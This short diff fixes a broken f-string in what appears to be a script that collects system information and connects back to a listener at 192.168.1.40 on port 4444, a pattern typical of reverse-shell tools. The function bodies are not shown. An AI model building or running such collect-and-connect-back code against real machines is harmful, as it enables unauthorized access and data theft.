@@ -32,6 +32,6 @@ if __name__ == '__main__':
     info = get_system_info()
     print(f"[+] System Info: {info}")
     if connect_listener():
-        print(f"[+] Connected to {'192.168.1.40:4444'")
+        print(f"[+] Connected to 192.168.1.40:4444")
     else:
         print("[-] Connection failed")
